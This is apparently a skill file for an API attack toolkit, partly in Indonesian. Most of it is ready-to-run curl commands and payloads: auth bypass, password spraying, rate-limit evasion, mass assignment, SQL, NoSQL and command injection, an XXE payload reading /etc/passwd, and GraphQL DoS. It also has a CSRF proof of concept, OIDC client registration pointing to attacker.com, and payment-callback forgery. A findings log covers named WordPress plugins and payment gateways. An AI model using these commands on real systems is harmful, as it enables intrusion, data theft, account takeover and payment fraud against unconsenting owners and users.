---
name: api-security
description: API security testing — REST, GraphQL, SOAP. Auth bypass, rate limit abuse, pagination flaws, mass assignment, parameter pollution, injection, IDOR at scale.
---

# API Security Toolkit

## Index

| # | Kategori | Isi |
|---|----------|-----|
| 1 | Auth Bypass | Token manipulation, cookie reuse, OAuth flaws |
| 2 | Rate Limit Abuse | Burst, rotation, parallel, window bypass |
| 3 | Pagination Flaws | Missing limits, cursor manipulation, data leak |
| 4 | Mass Assignment | Role escalation, field injection, unexpected params |
| 5 | HTTP Parameter Pollution | Duplicate params, override, WAF evasion |
| 6 | GraphQL | Introspection, batching, DoS, deep recursion, auth bypass |
| 7 | API Key Discovery | Source maps, JS files, git leaks, error messages |
| 8 | IDOR at Scale | UUID enumeration, incremental IDs, parameter swapping |
| 9 | Content-Type Confusion | JSON ↔ XML ↔ form, XXE via content-type switch |
| 10 | Injection in APIs | SQLi, NoSQLi, SSTI, cmd injection via API params |
| 11 | CORS Misconfiguration | Origin echo, credentials, preflight |
| 12 | WebSocket API | CSWSH, origin bypass, message injection |

---

## 1 — Auth Bypass

```bash
# JWT manipulation
# Change alg to none, swap keys, crack secret (see web-exploit JWT section)

# Token reuse across environments
curl -H "Authorization: Bearer $PROD_TOKEN" https://staging.target.com/api/resource

# Cookie reuse
curl -b "session=$SESSION" https://staging.target.com/api/admin

# OAuth redirect_uri tampering
# Change callback to attacker domain → steal code

# Missing auth on methods
curl -X GET https://target.com/api/admin/users              # unauthenticated?
curl -X POST https://target.com/api/admin/users -d '...'    # POST vs GET bypass?
```

---

## 2 — Rate Limit Abuse

```bash
# Test rate limit threshold
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" https://target.com/api/login \
    -d "user=test$i&pass=test"
done | sort | uniq -c

# IP rotation bypass
for i in {1..50}; do
  curl -H "X-Forwarded-For: 10.0.0.$i" https://target.com/api/resource
done

# Multi-endpoint rotation
endpoints=("/api/login" "/api/auth" "/v1/login" "/v2/auth" "/api/v3/signin")
for ep in "${endpoints[@]}"; do
  curl -X POST "https://target.com$ep" -d "user=admin&pass=test"
done

# Burst before limiter activates
seq 1 30 | xargs -P 30 -I {} curl -s "https://target.com/api/resource" > /dev/null

# Password spraying (1 pass, many users)
while read user; do
  curl -X POST https://target.com/api/login -d "user=$user&pass=Spring2024!"
done < users.txt
```

---

## 3 — Pagination Flaws

```bash
# Missing limit parameter → dump all data
curl -s "https://target.com/api/users?limit=999999"
curl -s "https://target.com/api/users?limit=0"
curl -s "https://target.com/api/users?limit=-1"

# Cursor manipulation
curl -s "https://target.com/api/users?cursor=00000000-0000-0000-0000-000000000000"
curl -s "https://target.com/api/users?cursor=99999999-9999-9999-9999-999999999999"

# Offset-based enumeration
for offset in $(seq 0 100 10000); do
  curl -s "https://target.com/api/users?offset=$offset&limit=100"
done

# Page parameter tampering
curl -s "https://target.com/api/orders?page=1&limit=50"  # normal
curl -s "https://target.com/api/orders?page=2&limit=50"  # next page
# Check if other users' data appears
```

---

## 4 — Mass Assignment

```json
// POST /api/user/create
{"username":"test","password":"test","role":"admin"}
{"username":"test","password":"test","isAdmin":true}
{"username":"test","password":"test","is_admin":true}
{"username":"test","password":"test","balance":999999}
{"username":"test","password":"test","isVerified":true}
{"username":"test","password":"test","is_active":1}
{"username":"test","password":"test","permissions":"*"}

// PUT /api/profile
{"role":"admin"}
{"is_admin":true}
{"isAdmin":true,"balance":5000}
{"email":"test@test.com","isManager":true}

// PATCH /api/user/1
[{"op":"replace","path":"/role","value":"admin"}]
```

```bash
# Test with ffuf
ffuf -u https://target.com/api/user/create -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","FUZZ":true}' \
  -w /usr/share/wordlists/params.txt \
  -fc 400,422
```

---

## 5 — HTTP Parameter Pollution

```bash
# Duplicate params — server takes last/first/first+last
curl "https://target.com/api/resource?id=1&id=2&id=3"
curl "https://target.com/api/login?user=admin&user=user&pass=test&pass=admin"

# Mix GET/POST params
curl -X POST "https://target.com/api/resource?id=1" -d "id=2&role=admin"

# Array notation
curl "https://target.com/api/users?id[]=1&id[]=2&id[]=3"

# Override with different case
curl "https://target.com/api/resource?ID=1&id=2&Id=3"

# WAF bypass via HPP
# ?page=1&page=2&page=1' UNION SELECT 1,2,3--
# WAF checks first or last, but DB receives concatenated
```

---

## 6 — GraphQL

```bash
# Introspection
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'

# Batching (rate limit + brute force)
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query{a:user(id:1){email}b:user(id:2){email}c:user(id:3){email}}"}'

# Deep recursion DoS
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query{user{friends{user{friends{user{friends{name}}}}}}}"}'

# Mutation abuse
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(id:1,input:{role:admin}){id,role}}"}'

# Auth bypass via __typename
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'  # if accessible, check other queries
```

---

## 7 — API Key Discovery

```bash
# Source maps
curl -s "https://target.com/static/js/main.js.map" | jq '.sources[]' 2>/dev/null

# JS files
grep -oP '(?:sk-[a-zA-Z0-9]{20,}|AKIA[0-9A-Z]{16}|eyJ[a-zA-Z0-9_-]+\.eyJ)' *.js

# Common API paths
ffuf -u https://target.com/FUZZ -w api-paths.txt -mc 200,401,403
# api-paths.txt: /api /v1 /v2 /graphql /swagger /docs /redoc /openapi.json

# Error messages (leak keys in stack traces)
curl -X POST https://target.com/api/resource -H "Content-Type: application/json" \
  -d '{"malformed":'

# Git exposure
curl -s "https://target.com/.git/config" | grep -i url
```

---

## 8 — IDOR at Scale

```bash
# UUID enumeration (try common formats)
curl -s "https://target.com/api/users/00000000-0000-0000-0000-000000000001"
curl -s "https://target.com/api/users/ffffffff-ffff-ffff-ffff-ffffffffffff"

# Incremental IDs
for i in $(seq 1000 1100); do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    "https://target.com/api/order/ORDER-$i"
done

# Base64/md5 user IDs
echo -n "1" | base64  # try: curl /api/user/MQ==
echo -n "admin" | md5sum

# Multi-parameter IDOR
curl -s "https://target.com/api/invoice?user_id=1&invoice_id=100" -b "session=user"
curl -s "https://target.com/api/invoice?user_id=2&invoice_id=100" -b "session=user"

# Parameter swapping
# original: POST /api/transfer {"from":"user1","to":"user2","amount":100}
# try:      POST /api/transfer {"from":"user2","to":"user1","amount":100}
```

---

## 9 — Content-Type Confusion

```bash
# JSON → XML (may trigger XXE)
curl -X POST https://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# JSON → form-urlencoded (may bypass filter)
curl -X POST https://target.com/api/login \
  -d "username=admin&password=test"

# Content-Type: text/plain (bypass JSON validator)
curl -X POST https://target.com/api/resource \
  -H "Content-Type: text/plain" \
  -d '{"role":"admin"}'

# Charset confusion
curl -X POST https://target.com/api/resource \
  -H "Content-Type: application/json; charset=utf-16" \
  --data-binary @payload-utf16.bin
```

---

## 10 — Injection in APIs

```bash
# SQLi in JSON
curl -X POST https://target.com/api/users -H "Content-Type: application/json" \
  -d '{"id":"1'"'"' OR '"'"'1'"'"'='"'"'1"}'

# NoSQLi in JSON
curl -X POST https://target.com/api/login -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# SSTI in JSON
curl -X POST https://target.com/api/render -H "Content-Type: application/json" \
  -d '{"template":"{{7*7}}"}'

# Command injection in JSON
curl -X POST https://target.com/api/ping -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;id"}'
```

---

## 11 — CORS Misconfiguration

```bash
# Test each API endpoint
curl -sI -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  "https://target.com/api/resource" | grep -i 'access-control'

# Check for credentials + wildcard
curl -sI -H "Origin: https://evil.com" "https://target.com/api/auth/session"

# Preflight abuse
curl -X OPTIONS "https://target.com/api/resource" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE"
```

---

## 12 — WebSocket API

```bash
# Test WebSocket endpoint
curl -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://target.com/ws"

# Origin bypass
curl -H "Upgrade: websocket" -H "Origin: https://evil.com" \
  -H "Sec-WebSocket-Version: 13" \
  "https://target.com/ws"

# Auth in URL (token leakage via Referer)
# wss://target.com/ws?token=SECRET
```

---

## Live Testing — Append New Findings

> **Aturan:** Saat live testing nemu teknik API attack BARU, tambah entry baru di sini. **JANGAN edit/hapus entry lama.**

### [N+1] — CORS-to-CSRF Chain (WP REST API)

**Target:** WordPress REST API dengan CORS misconfiguration
**Endpoint:** `/wp-json/wp/v2/*`
**Payload:**
```bash
# CORS verification
curl -sI -H "Origin: https://evil.com" "https://target.com/wp-json/" | grep -i access-control
# Jika echo origin + credentials:true → CSRF bisa
```
**PoC HTML:**
```html
<script>
fetch('https://target.com/wp-json/wp/v2/settings', {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({title:"Hacked", description:"CSRF"})
});
</script>
```
**Tool:** curl, browser
**Catatan:** CORS echo origin + credentials:true memungkinkan CSRF attack memanfaatkan session admin yang sedang login. Bisa ubah settings, buat/hapus post, upload media.

### [N+2] — RTTPG (The Post Grid) — Endpoint POST Tanpa Auth + Data Leak

**Target:** Plugin The Post Grid 7.4.2
**Endpoint:** `/wp-json/rttpg/v1/*` (12 endpoint)
**Payload:**
```bash
# List semua endpoint
curl -s "https://target.com/wp-json/" | jq '.namespaces' | grep rttpg

# Data leak — dump semua post tanpa auth
curl -s -X POST "https://target.com/wp-json/rttpg/v1/query" \
  -H "Content-Type: application/json" \
  -d '{"posts_per_page":500}'
# Response: 100+ posts per request — title, content, author, image, metadata, ACF

# Fake success — elimport
curl -X POST "https://target.com/wp-json/rttpg/v1/elimport" \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'
# Response: {"success":true} — tidak benar-benar nulis data
```
**Tool:** curl
**Catatan:** 5 endpoint POST tanpa autentikasi: `elimport`, `query`, `builder`, `filter`, `countlayout`. `query` membeberkan semua post (termasuk draft jika ada). `elimport` return success palsu. 3 endpoint CSS write butuh auth (401). `categories` return 500 error.

### [N+3] — Avada FAQ — Custom Post Type Data Leak

**Target:** Avada Theme (Fusion Builder)
**Endpoint:** `/wp-json/wp/v2/avada_faq`
**Payload:**
```bash
curl -s "https://target.com/wp-json/wp/v2/avada_faq"
# Response: FAQ items — judul, konten, metadata
```
**Tool:** curl
**Catatan:** Custom post type `avada_faq` dari Avada Theme bisa diakses publik tanpa auth. Mengekspos FAQ items yang mungkin berisi informasi internal. Cek juga custom post type lain via `/wp-json/wp/v2/types`.

### [N+4] — OIDC SSO — Device Authorization Grant Publik

**Target:** OIDC Identity Provider (elpan IdP)
**Endpoint:** `POST /identity/device_authorization`
**Payload:**
```bash
# Generate device code tanpa auth
curl -X POST "https://sso.target.com/identity/device_authorization" \
  -d "client_id=CLIENT_ID&scope=openid"
# Response: device_code + user_code + verification_uri

# Poll token dengan device code
curl -X POST "https://sso.target.com/identity/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=CODE&client_id=CLIENT_ID"
```
**Tool:** curl
**Catatan:** Device Authorization Grant tanpa autentikasi memungkinkan siapa pun generate device_code. Kombinasikan dengan phishing: buat halaman login palsu yang suruh user masukkan user_code di `verification_uri` legitimate — token terbit, attacker intercept.

### [N+5] — OIDC SSO — Dynamic Client Registration Publik

**Target:** OIDC Identity Provider
**Endpoint:** `POST /identity/register`
**Payload:**
```bash
# Test apakah registration aktif
curl -X POST "https://sso.target.com/identity/register" \
  -H "Content-Type: application/json" \
  -d '{}'
# Response: {"error":"invalid_redirect_uri","error_description":"At least one redirect_uris entry is required."}
# Jika response validasi → registration AKTIF

# Daftarkan client baru dengan redirect_uri attacker
curl -X POST "https://sso.target.com/identity/register" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["https://attacker.com/callback"],"client_name":"Malicious","scope":"openid profile"}'
```
**Tool:** curl
**Catatan:** Jika response error validasi (bukan 401/404), dynamic client registration aktif. Attacker bisa daftarkan client dengan redirect_uri sendiri, lalu intercept authorization code dari user yang login via OIDC.

### [N+6] — OIDC SSO — Token Introspection Tanpa Autentikasi (auth_method: none)

**Target:** OIDC Identity Provider
**Endpoint:** `POST /identity/introspect`
**Payload:**
```bash
# Daftarkan client dengan token_endpoint_auth_method: none
curl -X POST "https://sso.target.com/identity/register" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["http://127.0.0.1/callback"],"client_name":"anon","scope":"openid","token_endpoint_auth_method":"none"}'

# Introspect token tanpa secret — cukup client_id
curl -X POST "https://sso.target.com/identity/introspect" \
  -d "token=TOKEN&client_id=CLIENT_ID_WITH_NONE"
# Response: {"active":false} — atau detail token jika valid
```
**Tool:** curl
**Catatan:** Client dengan `token_endpoint_auth_method: none` tidak butuh client_secret. Introspection endpoint jadi publik untuk client tersebut. Bisa dipakai cek validitas token orang lain. Jika introspection return detail (scope, username, client_id) — informasi sensitif bocor.

### [N+7] — OIDC SSO — JWT Response Mode Signing

**Target:** OIDC Identity Provider
**Endpoint:** `GET /identity/authorize?response_mode=jwt`
**Payload:**
```bash
# Dapatkan JWT signed response
curl -s "https://sso.target.com/identity/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=CALLBACK&scope=openid&response_mode=jwt"

# Decode JWT
echo "JWT_PAYLOAD" | cut -d. -f2 | base64 -d | jq .
# Header: {"alg":"RS256","kid":"...","typ":"JWT"}
# Payload: {"iss":"...","aud":"...","exp":...,"error":"...","state":"..."}

# Ambil public key dari JWKS
curl -s "https://sso.target.com/identity/jwks.json" | jq .
```
**Tool:** curl
**Catatan:** response_mode=jwt menghasilkan JWT signed dengan kunci privat server. Bisa diverifikasi via JWKS endpoint. Analisis signature memungkinkan JWT algorithm confusion attack (RS256 → HS256) jika server tidak validasi alg dengan benar.

### [N+8] — OIDC Client Registration Management (Read/Update/Delete)

**Target:** OIDC Identity Provider dengan Dynamic Client Registration
**Endpoint:** `GET/PUT/DELETE /identity/register/{client_id}`
**Payload:**
```bash
# Read client config (butuh registration_access_token)
curl -H "Authorization: Bearer REGISTRATION_ACCESS_TOKEN" \
  "https://sso.target.com/identity/register/CLIENT_ID"

# Update client — ganti redirect_uri
curl -X PUT "https://sso.target.com/identity/register/CLIENT_ID" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGISTRATION_ACCESS_TOKEN" \
  -d '{"redirect_uris":["http://127.0.0.1/callback"],"client_name":"Updated"}'

# Delete client
curl -X DELETE "https://sso.target.com/identity/register/CLIENT_ID" \
  -H "Authorization: Bearer REGISTRATION_ACCESS_TOKEN"
```
**Tool:** curl
**Catatan:** Dynamic Client Registration biasanya menyertakan `registration_access_token` dan `registration_client_uri` di response. Token ini memungkinkan read/update/delete client registrasi. Simpan token ini — bisa dipakai untuk modifikasi client ilegal kapan saja. Beberapa IdP tidak validate ownership token dengan benar.

### [N+9] — OIDC Authorization — Multiple Response Mode Abuse

**Target:** OIDC Identity Provider
**Endpoint:** `GET /identity/authorize`
**Payload:**
```bash
# Test berbagai response mode
for mode in query form_post jwt query.jwt form_post.jwt; do
  echo "=== $mode ==="
  curl -s "https://sso.target.com/identity/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=CALLBACK&scope=openid&state=test&response_mode=$mode"
done

# form_post — auto-submit HTML form ke callback (CSRF potencial)
# form_post response:
# <form method="post" action="com.app://callback">
#   <input type="hidden" name="code" value="AUTH_CODE">
#   <input type="hidden" name="state" value="test">
# </form>
# <script>document.forms[0].submit()</script>

# jwt — response dibungkus dalam JWT signed
# query.jwt — code di query string + parameter JWT signature
# form_post.jwt — form post dengan signed JWT
```
**Tool:** curl
**Catatan:** Semakin banyak response mode didukung, semakin luas permukaan serangan. `form_post` bisa dipakai CSRF-style attack. `jwt` response perlu diverifikasi — jika signature lemah atau algorithm confusion, token bisa dipalsukan. Cek `response_modes_supported` di OpenID Configuration.

### [N+10] — Payment API — IDOR Horizontal (user_id Manipulation)

**Target:** Payment/recharge API
**Endpoint:** `POST /gateway/create`
**Payload:**
```bash
# Buat order untuk user_id yang berbeda (IDOR)
for uid in 0 1 99999 61064065; do
  curl -X POST "https://payment.target.com/gateway/create" \
    -d "user_id=$uid&user_name=test&product_id=coins_1&currency=IDR"
done
# Jika semua return code:0 — IDOR confirmed

# Coba user_id non-numeric
curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_id=admin&user_name=test&product_id=coins_1"
# 400 = validasi integer — aman dari SQLi
# 200 = mungkin username-based lookup

# Coba user_id kosong
curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_name=test&product_id=coins_1"
```
**Tool:** curl
**Catatan:** Payment API sering tidak memvalidasi bahwa `user_id` yang dikirim sesuai dengan session login user. Siapa pun bisa buat order pembayaran untuk user lain. Cek juga apakah `user_name` divalidasi sesuai dengan `user_id` — banyak sistem trust input tanpa verifikasi. Jika IDOR + No Auth + No CSRF + CORS wildcard, kombinasinya critical.

### [N+11] — Payment API — Price/Amount Tampering (Negative Test)

**Target:** Payment/recharge API
**Endpoint:** `POST /gateway/create`
**Payload:**
```bash
# Test parameter tampering untuk gratis
curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_id=TARGET&product_id=coins_1&price=0"

curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_id=TARGET&product_id=coins_1&amount=0"

curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_id=TARGET&product_id=coins_1&is_free=1&free=1&promo=1"

curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_id=TARGET&product_id=coins_1&coin=999999"

curl -X POST "https://payment.target.com/gateway/create" \
  -d "user_id=TARGET&product_id=coins_1&gift_to=TARGET&type=gift"

# Cek apakah response berbeda — jika amount di payment URL berubah, tampering berhasil
```
**Tool:** curl
**Catatan:** Parameter tampering pada payment API jarang berhasil (harga biasanya server-side dari DB). Tapi tetap perlu dicek untuk memastikan. Perhatikan response `payment_url` — jika amount di URL berbeda dari yang seharusnya, tampering berhasil. Juga cek apakah parameter `currency` berbeda menyebabkan error (info disclosure via stack trace).

### [N+12] — Payment Callback Forgery — Notify Endpoint Without Auth/Signature

**Target:** Payment gateway notify/callback endpoint
**Endpoint:** `POST /{gateway}/notify`
**Payload:**
```bash
# 1. Detect callback endpoints
for path in /antom/notify /payloco/notify /payermax/notify; do
  echo -n "$path GET: "
  curl -sI "https://target.com$path" -o /dev/null -w "%{http_code}\n"
  echo -n "$path POST: "
  curl -X POST "https://target.com$path" -d "test=1" -o /dev/null -w "%{http_code}\n"
done

# 2. Test with empty JSON (bypass signature check)
curl -X POST "https://target.com/antom/notify" \
  -H "Content-Type: application/json" \
  -d '{}'
# SUCCESS → no signature validation

# 3. Test with form data (reveal tech stack)
curl -X POST "https://target.com/antom/notify" \
  -d "order_id=test&status=SUCCESS"
# JsonParseException → Jackson parser → Java backend

# 4. Test with specific gateway params
curl -X POST "https://target.com/antom/notify" \
  -H "Content-Type: application/json" \
  -d '{"reference_id":"test","payment_request_id":"req1","transaction_id":"txn1","status":"SUCCESS","amount":1000}'
# If SUCCESS → forged payment notification confirmed
```
**Tool:** curl
**Catatan:** Callback endpoints yang tidak memvalidasi signature/token memungkinkan forged payment notification. Deteksi: kirim JSON kosong atau random — jika return SUCCESS, endpoint tidak validasi. Deteksi tech stack: jika form-urlencoded return JsonParseException → Java + Jackson. Jika return {"code":-1} atau error berbeda → endpoint memvalidasi parameter. Selalu cek GET method juga — 405 berarti endpoint ada tapi method salah.
